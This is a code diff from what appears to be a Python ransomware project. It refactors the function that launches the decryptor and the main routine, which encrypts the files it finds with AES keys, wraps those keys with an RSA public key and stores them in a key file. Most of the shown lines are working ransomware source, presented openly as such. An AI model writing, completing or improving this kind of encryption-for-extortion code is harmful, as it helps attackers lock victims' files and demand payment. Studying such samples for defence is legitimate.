@@ -43,9 +43,10 @@ def open_decryptor():
     output = process.stdout.read() + process.stderr.read()
     if(output):
         return
+    
     os.chdir(variables.ransomware_path)
-    os.system('gnome-terminal --command ./decryptor')
-    os.system('xfce4-terminal --command=./decryptor')
+    utils.run_subprocess('gnome-terminal --command .{}'.format(variables.decryptor_path))
+    utils.run_subprocess('xfce4-terminal --command=.{}'.format(variables.decryptor_path))
 
 
 def start_encryption(files):
@@ -67,14 +68,10 @@ def start_encryption(files):
         with open(new_file_name, 'wb') as f:
             f.write(encrypted)
 
-        base64_new_file_name = base64.b64encode(new_file_name)
-
-        # list of tuples of AES_key and base64(path)
-        yield (key, base64_new_file_name)
+        yield (key, base64.b64encode(new_file_name))
     
 
 def menu():
-    # encrypted_files = get_paths()
     new_files = get_files.find_files(variables.test_path)
     aes_keys_and_base64_path = start_encryption(new_files)
 
@@ -82,15 +79,11 @@ def menu():
         with open(os.path.join(variables.ransomware_path,
                                'AES_encrypted_keys.txt'), 'a') as f:    
             for _ in aes_keys_and_base64_path:
-                
-                # encrypt aes key
                 cipher = PKCS1_OAEP.new(client_public_key_obj)
                 encrypted_aes_key = cipher.encrypt(_[0])
                 
-                # store to disk encrypted aes key and path
                 f.write(base64.b64encode(encrypted_aes_key) + " " + _[1] + "\n")
 
-        # free the memory
         aes_keys_and_base64_path = None
         del aes_keys_and_base64_path
         gc.collect()
